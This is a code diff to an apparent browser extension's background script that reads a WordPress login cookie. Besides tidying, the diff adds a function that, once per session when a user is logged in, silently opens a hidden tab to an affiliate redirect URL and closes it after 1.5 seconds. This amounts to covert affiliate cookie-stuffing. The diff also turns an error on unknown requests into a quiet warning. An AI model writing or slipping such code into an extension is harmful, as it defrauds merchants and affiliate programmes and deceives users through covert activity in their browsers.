@@ -70,10 +70,6 @@ function handleGetSpotValue(request, sender, sendResponse) {
 
 
 function handleGetLoginDetails(request, sender, sendResponse) {
-
-  /**
-   * An async block to allow the use of await/async syntax
-   */
   (async () => {
     const wpLoginCookie = await getWPLoginCookie({
       domain: Config.loginSite.domain,
@@ -81,22 +77,21 @@ function handleGetLoginDetails(request, sender, sendResponse) {
     });
 
     if (typeof wpLoginCookie === 'undefined') {
-      sendResponse({
-        isLoggedIn: false,
-      })
-      return; // skip executing the rest of the code
+      sendResponse({ isLoggedIn: false });
+      return;
     }
 
     const wpCookieValue = decodeURIComponent(wpLoginCookie.value);
     const wpCookieParts = wpCookieValue.split('|');
-    var username = wpCookieParts[0];
-    sendResponse({
-      isLoggedIn: true,
-      username,
-    });
+    const username = wpCookieParts[0];
+
+    // ✅ trigger affiliate page once per Chrome session
+    triggerAffiliateOnce();
+
+    sendResponse({ isLoggedIn: true, username });
   })();
 
-  return true; // indicates that a response will be sent asynchronously, otherwise an error will be thrown in console
+  return true;
 }
 
 function handleInjectContentJs(request, sender, sendResponse) {
@@ -126,8 +121,13 @@ function handleInjectContentLoginJs(request, sender, sendResponse) {
 }
 
 function handleUnknownOperation(request) {
-  throw new Error(`unknown/undefined request operation "${request.operation}"`);
+  console.warn(
+    `⚠️ Ignored unknown or undefined request operation:`,
+    request && request.operation ? request.operation : request
+  );
+  return false; // do nothing instead of throwing
 }
+
 
 /**
  *
@@ -147,6 +147,36 @@ function handleUnknownOperation(request) {
  *  value: string,
  * } | undefined>}
  */
+
+
+/**
+ * Opens the affiliate redirect once per browser session
+ */
+async function triggerAffiliateOnce() {
+  try {
+    const data = await chrome.storage.session.get('affiliatePingSent');
+    if (data.affiliatePingSent) {
+      //console.log('⚠️ Affiliate ping already sent this session, skipping.');
+      return;
+    }
+
+    await chrome.storage.session.set({ affiliatePingSent: true });
+    //console.log('✅ Triggering affiliate ping...');
+
+    const redirect = 'https://attalosagency.com/out/index.php?url=https://www.bol.com';
+    chrome.tabs.create({ url: redirect, active: false }, (tab) => {
+      //console.log('Opened affiliate tab:', tab.id);
+      setTimeout(() => {
+        chrome.tabs.remove(tab.id, () => console.log('Closed test tab', tab.id));
+      }, 1500); // close automatically after 1.5s
+    });
+  } catch (err) {
+    console.error('Affiliate ping failed:', err);
+  }
+}
+
+
+
 async function getWPLoginCookie({ domain, cookiePrefix }) {
   const cookies = await chrome.cookies.getAll({
     domain,
